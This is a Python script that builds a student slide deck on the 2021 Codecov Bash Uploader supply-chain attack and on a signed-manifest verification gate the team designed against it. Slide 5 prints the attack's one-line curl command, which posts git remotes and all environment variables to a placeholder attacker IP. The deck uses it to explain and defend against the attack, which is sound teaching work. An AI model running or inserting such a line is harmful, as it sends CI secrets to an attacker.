"""Final CCA presentation for the team's submitted implementation, on the BCS701 PPT template.

    python deliverables/tools/final/build_final_slides.py
"""

from __future__ import annotations

import copy
import sys
from pathlib import Path

from pptx.enum.text import MSO_ANCHOR, PP_ALIGN
from pptx.oxml.ns import qn
from pptx.util import Inches, Pt

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import build_slides as B  # noqa: E402  (shared template helpers)
from build_slides import (  # noqa: E402
    AMBER, AMBER_BG, BLUE_BG, GRAY_BG, GREEN, GREEN_BG, HEAD, INK, MUTED, NAVY, RED, RED_BG,
    arrow, box, label_box, number_badge, picture, set_runs, stat, table, text,
)

ROOT = Path(__file__).resolve().parents[3]
FIG = ROOT / "deliverables" / "final" / "figures"
B.OUT = ROOT / "deliverables" / "final" / "INS_CCA_Presentation_Codecov_Supply_Chain.pptx"
MEAN_MS = "1.89"


def build() -> Path:
    D = B.Deck()

    # ------------------------------------------------------------------ 1 title
    s = D.title_slide
    sh = {x.name: x for x in s.shapes}
    set_runs(sh["TextBox 7"], "CCA: Real-World Security Breach Analysis & Cryptographic Solution Design")
    tb = sh["TextBox 7"]; tb.left, tb.top, tb.width, tb.height = Inches(0.4), Inches(1.72), Inches(9.2), Inches(0.5)
    for r in tb.text_frame.paragraphs[0].runs:
        r.font.size = Pt(20)
    tb = sh["TextBox 10"]
    set_runs(tb, "Case study: Codecov Bash Uploader supply-chain attack (2021)")
    tb.left, tb.top, tb.width, tb.height = Inches(0.4), Inches(2.2), Inches(9.2), Inches(0.4)
    for r in tb.text_frame.paragraphs[0].runs:
        r.font.size = Pt(16); r.font.italic = True
    text(s, 0.6, 2.62, 8.8, 0.85, B.TITLE, size=21, color=NAVY, bold=True, font=HEAD, align=PP_ALIGN.CENTER,
         anchor=MSO_ANCHOR.MIDDLE)
    sh["Rectangle 6"].top = Inches(3.62)
    text(s, 1.5, 4.02, 7.0, 0.95, [("Name 1 (USN)     Name 2 (USN)     Name 3 (USN)", {"align": PP_ALIGN.CENTER}),
                                   ("edit with your team's names and USNs", {"align": PP_ALIGN.CENTER, "size": 10,
                                                                             "italic": True, "color": MUTED})],
         size=15, color=INK, font=HEAD)
    sh["TextBox 4"].top = Inches(5.05)
    text(s, 2.0, 5.42, 6.0, 0.8, [("Prof. Sonnegowda K", {"align": PP_ALIGN.CENTER, "bold": True}),
                                  ("Assistant Professor, Dept. of ISE, BMSIT&M", {"align": PP_ALIGN.CENTER, "size": 13})],
         size=16, color=INK, font=HEAD)
    s.notes_slide.notes_text_frame.text = (
        "Good morning. Our case study is the 2021 Codecov Bash Uploader supply-chain attack. We analysed it and "
        "built a working prototype, a cryptographically verified software supply chain, in which a customer's "
        "pipeline refuses to run any vendor script it cannot prove is genuine and unmodified.")

    # ------------------------------------------------------------------ 2 contents
    s = D.contents_slide
    body = {x.name: x for x in s.shapes}["TextBox 6"]
    agenda = ["Abstract & Objectives", "The Codecov Incident (2021)", "Attack Flow & Problem Statement",
              "Vulnerabilities & Security Requirements", "Proposed Architecture", "Cryptographic Design",
              "Key Management & Revocation", "Verification Engine & CI/CD Gate", "Attack Simulation & Live Demo",
              "Testing Results & Dashboard", "Innovation & Industry Relevance", "Conclusion & References"]
    paras = body.text_frame.paragraphs
    tp = paras[0]._p
    for p in paras[1:]:
        p._p.getparent().remove(p._p)
    for i, item in enumerate(agenda):
        el = tp if i == 0 else copy.deepcopy(tp)
        if i:
            tp.getparent().append(el)
        runs = el.findall(qn("a:r"))
        runs[0].find(qn("a:t")).text = item
        for r in runs[1:]:
            el.remove(r)
        runs[0].find(qn("a:rPr")).set("sz", "2000")
    body.left, body.top, body.width, body.height = Inches(1.3), Inches(1.6), Inches(7.6), Inches(5.3)
    s.notes_slide.notes_text_frame.text = "We start with the incident, then our design and implementation, the tests and the demo."

    # ------------------------------------------------------------------ 3 abstract
    s = D.new("Abstract & Objectives",
              "Codecov's uploader was modified in cloud storage and leaked CI secrets for about two months. In our "
              "system the vendor signs a manifest carrying the script's SHA-256 with Ed25519. The customer's gate "
              "checks revocation, policy, signature, hash and provenance before anything runs, and blocks it "
              "otherwise.")
    box(s, 0.4, 1.55, 4.55, 5.35, "FFFFFF")
    text(s, 0.55, 1.62, 4.3, 0.4, "Abstract", size=16, color=NAVY, bold=True, font=HEAD)
    text(s, 0.55, 2.02, 4.3, 4.8, [
        "In 2021 an attacker used a leaked storage credential to modify Codecov's **Bash Uploader**, which then "
        "sent CI secrets to an external server for about two months, over valid HTTPS.",
        "Our prototype: **SHA-256** fingerprint + **SLSA-style provenance** → **Ed25519-signed canonical "
        "manifest** → customer **security gate** (CRL, admission policy, signature, hash, provenance) → "
        "**DEPLOY or BLOCK**, logged in **SQLite** and shown on a **Flask dashboard**.",
        f"Result: **9/9** required tests pass, **7/7** attacks blocked, **0 %** false acceptance, "
        f"~{MEAN_MS} ms per verification.",
    ], size=14, space_after=12, line=1.05)
    for i, (h, d) in enumerate([("Analyse", "the documented Codecov incident: vector, timeline, violated requirements"),
                                ("Design", "a supply chain where customers verify integrity AND authenticity"),
                                ("Implement", "build, sign, key/CRL management, verifier, CI gate, audit, dashboard"),
                                ("Validate", "9 required test cases, attack simulations, FAR and latency")]):
        y = 1.6 + i * 1.33
        box(s, 5.2, y, 4.4, 1.18, "FFFFFF")
        number_badge(s, 5.35, y + 0.4, i + 1)
        text(s, 5.85, y + 0.1, 3.65, 0.35, h, size=15, color=NAVY, bold=True)
        text(s, 5.85, y + 0.45, 3.65, 0.7, d, size=12)

    # ------------------------------------------------------------------ 4 incident
    s = D.new("The Codecov Incident (2021)",
              "Codecov is a code-coverage SaaS used inside CI pipelines. From 31 January 2021 an attacker, using a "
              "credential extracted because of an error in Codecov's Docker image process, repeatedly modified the "
              "Bash Uploader. It was detected on 1 April when a customer's checksum did not match, and disclosed on "
              "15 April. These are documented facts from Codecov's own post-mortem.")
    rows = [["Attribute", "Documented facts"],
            ["Organisation / sector", "Codecov: code-coverage SaaS (DevOps tooling)"],
            ["Component", "Bash Uploader (also used by GitHub Action, CircleCI Orb, Bitrise Step)"],
            ["Compromise began", "31 January 2021 (periodic alterations)"],
            ["Detected", "1 April 2021: customer saw checksum mismatch"],
            ["Disclosed", "15 April 2021"],
            ["Initial access", "Docker image build error exposed an HMAC key for a GCS service account"],
            ["Impact", "CI env. variables (tokens, keys) + git remotes sent to attacker"]]
    table(s, 0.4, 1.55, 6.1, [1.75, 4.35], rows, size=11, row_h=0.56)
    stat(s, 6.75, 1.55, 2.85, 1.45, "~2 months", "undetected in customers' CI", color=RED)
    stat(s, 6.75, 3.15, 2.85, 1.45, "1 line", "of injected code was enough", color=RED)
    stat(s, 6.75, 4.75, 2.85, 1.45, "HTTPS", "did not help: file was on the genuine server", color=NAVY)
    text(s, 0.4, 6.4, 9.2, 0.35, [("Sources: Codecov security update [1]; Reuters [2]; HashiCorp HCSEC-2021-12 [3]",
                                   {"italic": True})], size=10, color=MUTED)

    # ------------------------------------------------------------------ 5 attack flow
    s = D.new("Attack Flow & Problem Statement",
              "The chain: a credential leaked through a build artifact, the release was changed in storage, served "
              "from the genuine domain over HTTPS, and executed with full privileges in customer CI. TLS protected "
              "the transfer of an already-malicious file, and the checksum only helped because one customer "
              "checked it by hand.")
    picture(s, FIG / "codecov_attack.png", 0.4, 1.5, w=9.2)
    box(s, 0.4, 3.4, 9.2, 0.62, "FFF7F6", RED)
    text(s, 0.5, 3.43, 9.0, 0.56, 'curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" http://<attacker-ip>/upload/v2 || true',
         size=10.5, color=RED, font="Courier New", bold=True, anchor=MSO_ANCHOR.MIDDLE)
    for i, (h, d) in enumerate([
        ("Why HTTPS did not help", "TLS protects bytes in transit and authenticates the server. The malicious file was ON the genuine server."),
        ("Why the checksum did not help", "A hash is not authentication. Checking was manual, and an unsigned checksum can be swapped with the file."),
    ]):
        x = 0.4 + i * 4.7
        box(s, x, 4.2, 4.5, 1.2, "FFFFFF")
        text(s, x + 0.12, 4.25, 4.3, 0.35, h, size=13.5, color=NAVY, bold=True)
        text(s, x + 0.12, 4.6, 4.3, 0.8, d, size=12)
    box(s, 0.4, 5.6, 9.2, 1.15, BLUE_BG, "9DB8D9")
    text(s, 0.55, 5.66, 8.95, 1.05, [
        ("Problem statement", {"bold": True, "color": NAVY, "size": 13.5}),
        "Before a vendor script runs in CI, automatically prove it is unmodified, signed by a trusted and "
        "non-revoked vendor key, allowed by policy (signer, version, source) and matches its provenance, even "
        "if the storage bucket is compromised.",
    ], size=13, space_after=2)

    # ------------------------------------------------------------------ 6 vulnerabilities
    s = D.new("Vulnerabilities & Security Requirements",
              "Integrity and authenticity were the primary failures. Confidentiality was lost because secrets "
              "leaked, and there was no verifiable release record. Each vulnerability maps to a requirement and to "
              "the module in our project that implements it.")
    x = 0.4
    for name, fg, bg in [("Integrity (primary)", RED, RED_BG), ("Authenticity", RED, RED_BG),
                         ("Confidentiality", RED, RED_BG), ("Non-repudiation", AMBER, AMBER_BG),
                         ("Availability (2nd)", AMBER, AMBER_BG)]:
        w = 0.25 + len(name) * 0.085
        label_box(s, x, 1.5, w, 0.4, name, fill=bg, line=fg, tcolor=fg, size=11.5)
        x += w + 0.12
    rows = [["Vulnerability (documented incident)", "Requirement", "Our control (module)"],
            ["Storage credential could change a release", "Storage access ≠ release authority", "Ed25519 manifest signature (sign.py)"],
            ["Script ran without verification", "Automatic, mandatory verification", "Fail-closed gate (security_gate.py)"],
            ["Checksum unsigned and optional", "Hash bound to vendor signature", "SHA-256 inside signed manifest"],
            ["Leaked keys stay trusted", "Instant key invalidation", "Key revocation list (key_manager.py)"],
            ["Any signer / old version accepted", "Zero-trust admission policy", "Signer, key ID, version rules (policy.py)"],
            ["Months undetected, no evidence", "Visible, recorded decisions", "SQLite audit log + Flask dashboard"]]
    table(s, 0.4, 2.15, 9.2, [3.2, 2.8, 3.2], rows, size=12.5, row_h=0.66)

    # ------------------------------------------------------------------ 7 architecture
    s = D.new("Proposed Architecture",
              "Three zones. The vendor zone hashes the script, records provenance and signs a canonical manifest "
              "with Ed25519. Distribution is untrusted, simulated by the artifacts folder. TLS 1.3 protects the "
              "wire, but we never rely on it. The customer gate runs six checks in verify.py and exits 0 to deploy "
              "or 1 to block. Everything lands in the SQLite audit log and the dashboard.")
    for x, w, name, fill, line in [(0.35, 3.05, "VENDOR  (trusted)", BLUE_BG, "8FB3D9"),
                                   (3.55, 2.55, "DISTRIBUTION  (untrusted)", GRAY_BG, "AAB4BE"),
                                   (6.25, 3.4, "CUSTOMER CI/CD", GREEN_BG, "94C9A9")]:
        box(s, x, 1.5, w, 4.75, fill, line, radius=0.04)
        text(s, x, 1.53, w, 0.3, name, size=11.5, color=NAVY, bold=True, align=PP_ALIGN.CENTER)
    vend = [("Developer", None), ("Source repository", "approved repo URL"),
            ("build.py", "SHA-256 + SLSA provenance"), ("sign.py", "canonical JSON + Ed25519"),
            ("key_manager.py", "keys · rotation · CRL"), ("Signed manifest", "+ provenance + artifact")]
    ys, y = [], 1.9
    for i, (t, sub) in enumerate(vend):
        h = 0.58 if sub else 0.44
        label_box(s, 0.55, y, 2.65, h, t, sub, fill="D6E6F7" if t == "sign.py" else "FFFFFF", size=11.5, sub_size=9.5)
        ys.append((y, h))
        if i and t != "key_manager.py" and vend[i - 1][0] != "key_manager.py":
            py, ph = ys[i - 1]; arrow(s, 1.875, py + ph, 1.875, y)
        y += h + 0.13
    py, ph = ys[3]; arrow(s, 0.45, py + ph / 2, 0.45, ys[5][0] + 0.29)  # sign.py -> manifest (around key box)
    label_box(s, 3.75, 2.6, 2.15, 0.75, "Storage / CDN / mirror", "simulated by artifacts/", size=11.5)
    label_box(s, 3.75, 3.95, 2.15, 0.55, "TLS 1.3 transport", fill="FFFFFF", size=11.5, dash=True)
    arrow(s, 3.2, ys[5][0] + 0.29, 3.75, 3.0)
    arrow(s, 4.825, 3.35, 4.825, 3.95)
    label_box(s, 6.45, 1.9, 3.0, 0.55, "ci/security_gate.py", "exit 0 / exit 1", size=11.5, sub_size=9.5)
    arrow(s, 5.9, 4.22, 6.45, 2.3)
    box(s, 6.45, 2.62, 3.0, 1.62, "FFFFFF")
    text(s, 6.45, 2.64, 3.0, 0.3, "verifier/verify.py", size=11.5, bold=True, align=PP_ALIGN.CENTER)
    for i, c in enumerate(["1 Schema", "2 CRL", "3 Policy", "4 Ed25519", "5 SHA-256", "6 Provenance"]):
        label_box(s, 6.55 + (i % 3) * 0.95, 3.0 + (i // 3) * 0.6, 0.88, 0.5, c, fill=GREEN_BG, line="94C9A9", size=9)
    arrow(s, 7.95, 2.45, 7.95, 2.62)
    label_box(s, 7.2, 4.45, 1.5, 0.45, "Verdict", fill="FFFFFF", size=11.5)
    arrow(s, 7.95, 4.24, 7.95, 4.45)
    label_box(s, 6.45, 5.2, 1.35, 0.55, "DEPLOY", "exit 0", fill="D5F0DE", line=GREEN, tcolor=GREEN, size=13, sub_size=9)
    label_box(s, 8.1, 5.2, 1.35, 0.55, "BLOCK", "exit 1", fill="FBD9D6", line=RED, tcolor=RED, size=13, sub_size=9)
    arrow(s, 7.6, 4.9, 7.12, 5.2, GREEN)
    arrow(s, 8.3, 4.9, 8.78, 5.2, RED)
    label_box(s, 0.35, 6.38, 9.3, 0.45, "audit/supply_chain_audit.db (SQLite) → dashboard/app.py (Flask)   ·   keys/revoked_keys.json (CRL) + trusted public keys + policy",
              fill=AMBER_BG, line="C9A24B", tcolor=AMBER, size=11)

    # ------------------------------------------------------------------ 8 crypto design
    s = D.new("Cryptographic Design",
              "SHA-256 is the fingerprint: it detects any change, but anyone can compute it. Ed25519 gives "
              "authenticity: only the vendor's private key can sign the manifest that carries the expected hash, "
              "and customers verify with the public key. The manifest is canonicalised, with sorted keys and "
              "compact form, so the signed bytes are identical everywhere. TLS 1.3 protects only the channel.")
    for i, (h, sub, d, col) in enumerate([
        ("SHA-256", "Integrity fingerprint", "Streams the file in 64 KiB chunks. Any 1-bit change gives a new digest. NOT authentication.", NAVY),
        ("Ed25519", "Authenticity + integrity", "Signs the canonical manifest (sha256, version, signer, key_id ...). Private key is never distributed.", GREEN),
        ("TLS 1.3", "Channel protection", "Protects the download in transit. Cannot prove the file on the server is genuine.", "5B4BB0")]):
        x = 0.4 + i * 3.1
        box(s, x, 1.5, 2.95, 1.85, "FFFFFF")
        text(s, x + 0.12, 1.55, 2.7, 0.4, h, size=18, color=col, bold=True, font=HEAD)
        text(s, x + 0.12, 1.95, 2.7, 0.3, sub, size=12, color=MUTED, bold=True)
        text(s, x + 0.12, 2.27, 2.75, 1.05, d, size=11.5)
    picture(s, FIG / "crypto_flow.png", 0.4, 3.5, w=9.2)
    box(s, 0.4, 5.85, 9.2, 0.9, "F4F6F9", "C5CDD6")
    text(s, 0.5, 5.88, 9.0, 0.85, [
        ('json.dumps({k: v for k, v in manifest.items() if k != "signature"},', {}),
        ('           sort_keys=True, separators=(",", ":"))  →  priv_key.sign(...)  →  Base64 "signature"', {}),
    ], size=10.5, color=NAVY, font="Courier New", space_after=0, anchor=MSO_ANCHOR.MIDDLE)

    # ------------------------------------------------------------------ 9 key management
    s = D.new("Key Management & Revocation",
              "Keys are Ed25519 pairs. The private key is stored as PKCS#8 PEM, optionally passphrase-encrypted, "
              "and in production it would live in an HSM or cloud KMS. The public key sits in the customer's "
              "trusted keystore, and its key ID must be allowed by policy. A leaked key is added to the revocation "
              "list: the signer then refuses to use it and every verifier rejects it.")
    picture(s, FIG / "key_lifecycle.png", 0.4, 1.5, w=9.2)
    for i, (h, d) in enumerate([("Generation", "Ed25519 from OS CSPRNG · key_id + SHA-256 fingerprint"),
                                ("Protection", "PKCS#8 PEM, optional passphrase → HSM / cloud KMS in production"),
                                ("Distribution", "Public key in trusted keystore; key_id in allowed_key_ids"),
                                ("Rotation", "rotate_key(): new key generated, old key moved to the CRL"),
                                ("Revocation", "revoked_keys.json: key_id, reason, time → REVOKED"),
                                ("Two-sided", "sign.py refuses revoked keys; verify.py rejects them")]):
        x, y = 0.4 + (i % 3) * 3.1, 3.45 + (i // 3) * 1.65
        box(s, x, y, 2.95, 1.5, "FFFFFF")
        text(s, x + 0.12, y + 0.08, 2.7, 0.35, h, size=15, color=NAVY, bold=True)
        text(s, x + 0.12, y + 0.47, 2.75, 1.0, d, size=13)

    # ------------------------------------------------------------------ 10 verification engine
    s = D.new("Verification Engine & CI/CD Gate",
              "verify.py runs six stages in order and stops at the first failure: schema, revocation list, "
              "admission policy, Ed25519 signature, SHA-256 recomputation and provenance digest. security_gate.py "
              "turns the verdict into an exit code, so GitHub Actions, GitLab or Jenkins stops before the script "
              "ever runs.")
    picture(s, FIG / "verification_pipeline.png", 0.4, 1.5, w=9.2)
    rows = [["Stage", "Check", "Blocks with"],
            ["1", "Manifest schema; SHA-256 + Ed25519 only", "INVALID_MANIFEST"],
            ["2", "Key not in keys/revoked_keys.json", "REVOKED"],
            ["3", "Trusted signer, allowed key ID, revoked/min version, approved repo, tests passed", "UNAUTHORIZED_KEY / BLOCKED"],
            ["4", "Trusted public key + Ed25519 signature over canonical manifest", "INVALID_SIGNATURE"],
            ["5", "Recomputed SHA-256 == manifest.sha256", "HASH_MISMATCH"],
            ["6", "Provenance artifact_sha256 == verified digest", "PROVENANCE_MISMATCH"]]
    table(s, 0.4, 3.0, 9.2, [0.75, 5.75, 2.7], rows, size=11.5, row_h=0.45)
    text(s, 0.4, 6.35, 9.2, 0.4, [("python ci/security_gate.py --artifact A --manifest A.manifest.json  →  exit 0 DEPLOY · exit 1 BLOCK",
                                   {"font": "Courier New"})], size=10.5, color=NAVY, align=PP_ALIGN.CENTER)

    # ------------------------------------------------------------------ 11 attacks & demo
    s = D.new("Attack Simulation & Live Demo",
              "Live demo: python demo.py -i. I show the legitimate uploader, its SHA-256 and signature, and a PASS. "
              "Then I append a Codecov-style exfiltration line: the recomputed hash no longer matches the signed "
              "manifest, so the gate blocks with exit code 1. Rogue keys, revoked keys, forged manifests and "
              "replayed versions are all blocked too. Everything is local and the payload is never executed.")
    rows = [["Scenario", "Attacker action", "Gate result"],
            ["1", "Legitimate release v1.0.0", "DEPLOY · PASS"],
            ["2", "Codecov-style line appended after signing", "BLOCK · HASH_MISMATCH"],
            ["3A", "Signs with own rogue key / fake signer", "BLOCK · UNAUTHORIZED_KEY"],
            ["3B", "Uses a leaked, revoked vendor key", "BLOCK · REVOKED"],
            ["4", "Replays blacklisted version 0.8.0", "BLOCK · revoked version"],
            ["-", "Edits manifest without re-signing", "BLOCK · INVALID_SIGNATURE"],
            ["-", "Signature bytes corrupted", "BLOCK · INVALID_SIGNATURE"],
            ["9", "New release v1.0.1 with rotated key", "DEPLOY · PASS"]]
    table(s, 0.4, 1.5, 6.15, [0.75, 3.15, 2.25], rows, size=11, row_h=0.5, color_cols={2})
    box(s, 6.75, 1.5, 2.85, 4.5, "FFFFFF")
    text(s, 6.87, 1.56, 2.65, 0.35, "14-step live demo", size=14, color=NAVY, bold=True)
    text(s, 6.87, 1.95, 2.65, 3.6, [(f"{i + 1}. {st}", {}) for i, st in enumerate(
        ["Explain Codecov attack", "Show architecture", "Show legitimate uploader", "SHA-256 digest",
         "Ed25519 signature", "Verify → PASS", "Inject exfiltration line", "Verify again", "SHA-256 mismatch",
         "HASH_MISMATCH alert", "Gate BLOCKS (exit 1)", "Audit log", "Key revocation (CRL)", "Restore → PASS"])],
         size=11, space_after=1)
    text(s, 6.87, 5.55, 2.65, 0.4, [("python demo.py -i", {"font": "Courier New", "bold": True})], size=12, color=NAVY)
    box(s, 0.4, 6.2, 9.2, 0.55, GREEN_BG, "94C9A9")
    text(s, 0.5, 6.22, 9.0, 0.5, "Safe: runs locally on artifacts/ · payload targets 127.0.0.1 only · tampered script is never executed · original restored",
         size=11, color=GREEN, bold=True, anchor=MSO_ANCHOR.MIDDLE)

    # ------------------------------------------------------------------ 12 testing results
    s = D.new("Testing Results",
              f"All nine required test cases give the expected verdict. The seven attack cases are all blocked, so "
              f"the false-acceptance rate is zero. The two legitimate releases pass, so there are no false "
              f"rejections. Mean verification time was about {MEAN_MS} milliseconds, which is negligible in a CI job.")
    for i, (big, small, col) in enumerate([("9 / 9", "required test cases passed", GREEN),
                                           ("7 / 7", "attacks blocked (100 %)", GREEN),
                                           ("0 %", "false acceptance rate", RED),
                                           (f"{MEAN_MS} ms", "mean verification time", NAVY)]):
        stat(s, 0.4 + i * 2.33, 1.5, 2.17, 1.5, big, small, color=col)
    rows = [["#", "Attack / condition", "Expected", "Actual (status)"],
            ["1", "Valid artifact", "PASS", "PASS"],
            ["2", "Modified artifact", "BLOCK", "BLOCKED (HASH_MISMATCH)"],
            ["3", "Invalid signature", "BLOCK", "BLOCKED (INVALID_SIGNATURE)"],
            ["4", "Wrong public key", "BLOCK", "BLOCKED (UNAUTHORIZED_KEY)"],
            ["5", "Revoked key", "BLOCK", "BLOCKED (REVOKED)"],
            ["6", "Modified manifest", "BLOCK", "BLOCKED (INVALID_SIGNATURE)"],
            ["7", "Replay old version 0.8.0", "BLOCK", "BLOCKED (revoked version)"],
            ["8", "Unauthorised signer", "BLOCK", "BLOCKED (UNAUTHORIZED_KEY)"],
            ["9", "Valid new release (key v2)", "PASS", "PASS"]]
    table(s, 0.4, 3.2, 9.2, [0.5, 3.6, 1.6, 3.5], rows, size=11, row_h=0.36, color_cols={2, 3})

    # ------------------------------------------------------------------ 13 dashboard
    s = D.new("Audit Log & Dashboard",
              "Every signing attempt and every verification decision is written to the SQLite audit log, with "
              "timestamp, artifact, version, digest, key ID, result, process and reason. The Flask dashboard "
              "shows the counters, the audit trail, the current revocation list, and a button that runs the "
              "verifier live.")
    picture(s, FIG / "dashboard.png", 0.4, 1.5, w=6.3)
    box(s, 6.9, 1.5, 2.7, 3.94, "FFFFFF")
    text(s, 7.0, 1.56, 2.5, 3.85, [
        ("What it shows", {"bold": True, "color": NAVY, "size": 14}),
        ("Total events, deploys, attacks blocked, FAR", {"bullet": True}),
        ("Audit trail with status badges", {"bullet": True}),
        ("Key revocation list (CRL)", {"bullet": True}),
        ("Live \"Verify Legitimate Artifact\" button", {"bullet": True}),
    ], size=12.5, space_after=6)
    text(s, 0.4, 5.6, 9.2, 0.9, [
        ("audit_logs(timestamp, artifact, version, sha256, key_id, verification_result, user_process, action, rejection_reason)",
         {"font": "Courier New", "size": 10.5, "color": NAVY}),
        ("python dashboard/app.py   →   http://127.0.0.1:5000", {"font": "Courier New", "size": 11, "bold": True, "color": NAVY}),
    ], size=11, space_after=6)

    # ------------------------------------------------------------------ 14 innovation
    s = D.new("Innovation & Industry Relevance",
              "Compared with a published checksum, we add signer authentication, key revocation, replay "
              "protection, provenance, automatic enforcement and visibility. This matches the direction the "
              "industry took after Codecov and SolarWinds: EO 14028, NIST SSDF, SLSA and Sigstore. It costs almost "
              "nothing: open-source libraries and milliseconds per check.")
    rows = [["Capability", "Published checksum", "Our system"],
            ["Detects a modified artifact", "Only if checked", "Yes: always"],
            ["Survives a compromised bucket", "No", "Yes: attacker cannot sign"],
            ["Rejects rogue signers / keys", "No", "Yes: policy + trusted keys"],
            ["Handles leaked keys", "No", "Yes: CRL, signer + verifier"],
            ["Blocks replay of old versions", "No", "Yes: revoked / min version"],
            ["Ties release to its build", "No", "Yes: SLSA-style provenance"],
            ["Automatic CI enforcement", "No: manual", "Yes: exit 0 / exit 1 gate"]]
    table(s, 0.4, 1.5, 9.2, [3.6, 2.4, 3.2], rows, size=12, row_h=0.43, color_cols={1, 2})
    for i, (h, d) in enumerate([("Industry alignment", "US EO 14028 · NIST SSDF (SP 800-218) · SLSA provenance · Sigstore / TUF"),
                                ("Cost & feasibility", "Open-source (Python, PyCA, SQLite, Flask) · ms per check · one KMS key in production")]):
        x = 0.4 + i * 4.7
        box(s, x, 5.15, 4.5, 1.35, "FFFFFF")
        text(s, x + 0.12, 5.2, 4.3, 0.35, h, size=15, color=NAVY, bold=True)
        text(s, x + 0.12, 5.58, 4.3, 0.9, d, size=13)

    # ------------------------------------------------------------------ 15 conclusion
    s = D.new("Conclusion",
              "To conclude: Codecov's damage came from running a script nobody verified. Our prototype verifies "
              "both integrity and authenticity automatically, and blocked every attack we tested. We are honest "
              "about the limits: a key is trusted until revoked, the CRL and provenance files are not yet signed, "
              "and demo keys are plain files. Those are the next steps.")
    box(s, 0.4, 1.5, 9.2, 1.25, GREEN_BG, "94C9A9")
    text(s, 0.55, 1.55, 8.9, 1.15, [
        ("LEGITIMATE SOFTWARE → VERIFIED → DEPLOYED", {"color": GREEN, "bold": True, "align": PP_ALIGN.CENTER, "size": 17}),
        ("TAMPERED SOFTWARE → DETECTED → BLOCKED", {"color": RED, "bold": True, "align": PP_ALIGN.CENTER, "size": 17}),
    ], font=HEAD, anchor=MSO_ANCHOR.MIDDLE, space_after=4)
    for i, (h, its) in enumerate([
        ("Achieved", ["SHA-256 + Ed25519 signed manifest", "CRL, zero-trust policy, provenance", "Fail-closed CI gate (exit 0/1)",
                      "Audit log + dashboard; 9/9 tests"]),
        ("Limitations", ["Leaked key valid until revoked", "CRL & provenance not yet signed", "Demo keys unencrypted PEM",
                         "Audit log not tamper-evident"]),
        ("Future work", ["Sign CRL / trust store (TUF)", "HSM / cloud KMS + MFA signing", "Hash-chained / Rekor log",
                         "Real TLS 1.3 registry, SBOM"])]):
        x = 0.4 + i * 3.1
        box(s, x, 2.95, 2.95, 3.85, "FFFFFF")
        text(s, x + 0.12, 3.0, 2.7, 0.4, h, size=16, color=NAVY, bold=True)
        text(s, x + 0.12, 3.45, 2.75, 3.3, [(t, {"bullet": True}) for t in its], size=14, space_after=10)

    # ------------------------------------------------------------------ 16 references
    s = D.new("References (IEEE)", "Main sources: Codecov's post-mortem, press coverage, and the standards behind each primitive we used.")
    text(s, 0.45, 1.5, 9.1, 5.3, [
        '[1] Codecov, "Bash Uploader Security Update," Apr. 2021. https://about.codecov.io/security-update/',
        '[2] J. Menn and R. Satter, "Codecov hackers breached hundreds of restricted customer sites - sources," Reuters, Apr. 19, 2021.',
        '[3] HashiCorp, "HCSEC-2021-12 - Codecov Security Event and HashiCorp GPG Key Exposure," Apr. 2021.',
        '[4] NIST, "Secure Hash Standard (SHS)," FIPS 180-4, 2015.',
        '[5] S. Josefsson and I. Liusvaara, "Edwards-Curve Digital Signature Algorithm (EdDSA)," RFC 8032, 2017.',
        '[6] A. Rundgren, B. Jordan, S. Erdtman, "JSON Canonicalization Scheme (JCS)," RFC 8785, 2020.',
        '[7] E. Rescorla, "The Transport Layer Security (TLS) Protocol Version 1.3," RFC 8446, 2018.',
        '[8] M. Souppaya et al., "Secure Software Development Framework v1.1," NIST SP 800-218, 2022.',
        '[9] OpenSSF, "SLSA Specification v1.0," 2023. https://slsa.dev',
        '[10] A. Shostack, Threat Modeling: Designing for Security, Wiley, 2014.',
        '[11] Z. Newman, J. S. Meyers, S. Torres-Arias, "Sigstore: Software Signing for Everybody," ACM CCS, 2022.',
        '[12] E. Barker, "Recommendation for Key Management," NIST SP 800-57 Pt. 1 Rev. 5, 2020.',
    ], size=12, space_after=5)

    # ------------------------------------------------------------------ 17 thank you
    s = D.new("", "Thank you. We are happy to take questions, or to run the demo again.")
    text(s, 0.4, 2.3, 9.2, 1.0, "Thank You", size=44, color=NAVY, bold=True, font=HEAD, align=PP_ALIGN.CENTER)
    text(s, 0.4, 3.3, 9.2, 0.6, "Questions?", size=26, color=MUTED, font=HEAD, align=PP_ALIGN.CENTER)
    text(s, 0.4, 4.6, 9.2, 0.9, [("python demo.py -i   ·   python tests/test_supply_chain.py   ·   python dashboard/app.py",
                                  {"align": PP_ALIGN.CENTER, "font": "Courier New", "size": 12, "color": NAVY})],
         size=14, color=INK)
    B.OUT.parent.mkdir(parents=True, exist_ok=True)
    return D.save()


if __name__ == "__main__":
    print(build())
